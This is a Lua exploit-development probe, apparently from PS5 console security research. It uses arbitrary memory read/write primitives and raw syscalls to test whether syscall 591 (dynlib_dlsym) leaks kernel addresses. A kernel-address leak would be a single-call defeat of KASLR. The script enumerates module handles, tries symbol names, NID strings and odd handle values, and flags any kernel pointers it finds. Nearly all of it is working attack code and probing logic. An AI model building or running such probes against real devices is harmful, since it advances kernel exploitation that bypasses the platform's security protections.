-- CRASH_CLASS: LOW
-- PROBE 69c: sys 591 dynlib_dlsym with valid module handles + NID strings
--
-- Context: sys 591 was mislabeled in CLAUDE.md as "FatGid/setcred (CVE-2026-45250)"
-- but 13.60 CSV confirms 591 = dynlib_dlsym. Probe 392a only tested with zeros.
-- Three Session 1 documents (04, 08, 09) independently ranked this as highest-priority
-- untested KASLR vector. The 13.60 dossier shows NO authid gate.
--
-- If 591 resolves kernel-resident trampoline addresses (not just userland), it's
-- a single-call KASLR defeat. Even if it only resolves userland addresses,
-- it might expose addresses not visible through sys 593.

print("=== PROBE 69c: DLSYM REAL HANDLES ===")
print("")

local function N(v) if type(v)=="table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function rd(a) local ok,v=pcall(function() return memory.read_dword(a) end) if ok then return N(v) end return nil end
local function rq(a) local ok,v=pcall(function() return memory.read_qword(a) end) if ok then return v end return nil end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function get_hi_lo(val) if type(val)=="table" and val.h then return val.h,val.l end return 0,N(val) end
local function fmt(val) if val==nil then return "nil" end local h,l=get_hi_lo(val) return string.format("0x%08X%08X",h,l) end
local function sgn(v) local l=N(v) if l>=0x80000000 then l=l-0x100000000 end return l end
local function put_str(s) local p=memory.alloc(#s+2) for i=1,#s do pcall(function() memory.write_byte(p+i-1,string.byte(s,i)) end) end pcall(function() memory.write_byte(p+#s,0) end) return p end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Ignore SIGSYS
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa)+8, 0); wq(uint64(N(sa)+16), uint64(0))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

local sc591 = mk(591)  -- dynlib_dlsym
local sc593 = mk(593)  -- dynlib_get_info

-- [A] ENUMERATE MODULE HANDLES
print("-- [A] MODULE HANDLES --")
local handles = {}
local info = memory.alloc(0x200)
for h = 0, 50 do
    wd(N(info), 0x160)
    for i = 4, 0x1FC, 4 do wd(N(info)+i, 0) end
    local ret = sgn(mk(593)(uint64(h), info))
    if ret == 0 then
        local tlo = rd(N(info)+0x108) or 0
        local thi = rd(N(info)+0x10C) or 0
        if tlo < 0 then tlo = tlo + 0x100000000 end
        if thi < 0 then thi = thi + 0x100000000 end
        handles[#handles+1] = h
        if #handles <= 10 then
            print(string.format("  handle=%d text=0x%X%08X", h, thi, tlo))
        end
    end
end
print(string.format("  total modules: %d", #handles))

-- [B] TRY DLSYM WITH KNOWN COMMON SYMBOL NAMES
print("")
print("-- [B] DLSYM C NAMES --")
local names = {
    "sceKernelGetModuleInfo",
    "sceKernelDlsym",
    "sceKernelLoadStartModule",
    "sceSysmoduleLoadModule",
    "sceKernelSendNotificationRequest",
    "sceKernelDebugOutText",
    "printf",
    "malloc",
    "free",
    "memcpy",
    "strlen",
    "open",
    "close",
    "read",
    "write",
    "mmap",
    "munmap",
    "socket",
    "connect",
    "sceKernelGetProcessTime",
    "sceKernelGetCurrentCpu",
    "__stack_chk_fail",
    "__error",
}

local out_addr = memory.alloc(8)

for _, handle in ipairs({0, 1, 2, handles[1] or 0, handles[2] or 1}) do
    print(string.format("  --- handle=%d ---", handle))
    for _, name in ipairs(names) do
        if not alive() then print("DEAD"); return end
        wq(N(out_addr), uint64(0xDEAD))
        local name_ptr = put_str(name)
        local ret = sgn(sc591(uint64(handle), uint64(N(name_ptr)), uint64(N(out_addr))))
        local resolved = rq(N(out_addr))
        if ret == 0 and resolved ~= nil then
            local h, l = get_hi_lo(resolved)
            local tag = ""
            if h >= 0xFFFF8000 then tag = " *** KERNEL POINTER ***" end
            print(string.format("    %s: ret=%d addr=%s%s", name, ret, fmt(resolved), tag))
        elseif ret ~= -1 then
            print(string.format("    %s: ret=%d (unexpected)", name, ret))
        end
    end
    -- Print summary for this handle
    local any_resolved = false
    for _, name in ipairs({"printf", "malloc"}) do
        wq(N(out_addr), uint64(0xDEAD))
        local name_ptr = put_str(name)
        local ret = sgn(sc591(uint64(handle), uint64(N(name_ptr)), uint64(N(out_addr))))
        if ret == 0 then any_resolved = true end
    end
    if not any_resolved then
        print(string.format("    (all -1 for handle %d)", handle))
    end
end

-- [C] TRY DLSYM WITH NID HASH FORMAT
-- PS5 uses NID-encoded symbol names: 11 base64 chars + '#' + module NID
print("")
print("-- [C] DLSYM NID FORMAT --")
local nids = {
    "sceKernelGetModuleInfo#libkernel",
    "HoLVWNanBBc#libkernel",  -- sceKernelDlsym NID
    "Ou3iL1abvmg#libkernel",  -- sceKernelLoadStartModule NID
    "gWuCHYjEVlQ#libkernel",  -- sceKernelGetProcessTime NID
    "dk+rvF5Effk#libkernel",  -- sceKernelSleep NID
}
for _, nid in ipairs(nids) do
    if not alive() then break end
    wq(N(out_addr), uint64(0xDEAD))
    local name_ptr = put_str(nid)
    -- Try handle 0 (main), 1 (libkernel usually), and 0x2001 (RTLD_DEFAULT-like)
    for _, handle in ipairs({0, 1, 2, 0x2001, 0xFFFE}) do
        local ret = sgn(sc591(uint64(handle), uint64(N(name_ptr)), uint64(N(out_addr))))
        if ret == 0 then
            local resolved = rq(N(out_addr))
            local h, l = get_hi_lo(resolved)
            local tag = ""
            if h >= 0xFFFF8000 then tag = " *** KERNEL POINTER ***" end
            print(string.format("  %s h=%d: addr=%s%s", nid, handle, fmt(resolved), tag))
        end
    end
end

-- [D] SPECIAL HANDLE VALUES
print("")
print("-- [D] SPECIAL HANDLES --")
local special = {0, 0xFFFF, 0xFFFE, 0xFFFD, 0x2001, 0x4001, 0x8001, 0xFFFFFFFF}
local test_name = put_str("printf")
for _, handle in ipairs(special) do
    if not alive() then break end
    wq(N(out_addr), uint64(0xDEAD))
    local ret = sgn(sc591(uint64(handle), uint64(N(test_name)), uint64(N(out_addr))))
    local resolved = rq(N(out_addr))
    if ret ~= -1 or N(resolved or uint64(0xDEAD)) ~= 0xDEAD then
        print(string.format("  handle=0x%X: ret=%d addr=%s", handle, ret, fmt(resolved)))
    else
        print(string.format("  handle=0x%X: ret=-1", handle))
    end
end

-- [E] RAW SYSCALL BEHAVIOR — try different arg layouts
print("")
print("-- [E] ARG LAYOUT VARIANTS --")
-- Standard: 591(handle, name_ptr, out_ptr)
-- But maybe it takes more args (narg check)?
wq(N(out_addr), uint64(0xDEAD))
local name_ptr = put_str("printf")
-- 3-arg
local r3 = sgn(sc591(uint64(1), uint64(N(name_ptr)), uint64(N(out_addr))))
print(string.format("  3-arg: ret=%d addr=%s", r3, fmt(rq(N(out_addr)))))

-- 4-arg (maybe flags?)
wq(N(out_addr), uint64(0xDEAD))
local r4 = sgn(sc591(uint64(1), uint64(N(name_ptr)), uint64(N(out_addr)), uint64(0)))
print(string.format("  4-arg(flag=0): ret=%d addr=%s", r4, fmt(rq(N(out_addr)))))

wq(N(out_addr), uint64(0xDEAD))
local r4b = sgn(sc591(uint64(1), uint64(N(name_ptr)), uint64(N(out_addr)), uint64(1)))
print(string.format("  4-arg(flag=1): ret=%d addr=%s", r4b, fmt(rq(N(out_addr)))))

-- 2-arg (maybe just handle + name, return in rax?)
local r2 = sgn(sc591(uint64(1), uint64(N(name_ptr))))
print(string.format("  2-arg: ret=%d (rax=%s)", r2, fmt(uint64(r2 < 0 and r2+0x100000000 or r2))))

print("")
print("alive=" .. (alive() and "YES" or "NO"))
print("=== 69c DONE ===")
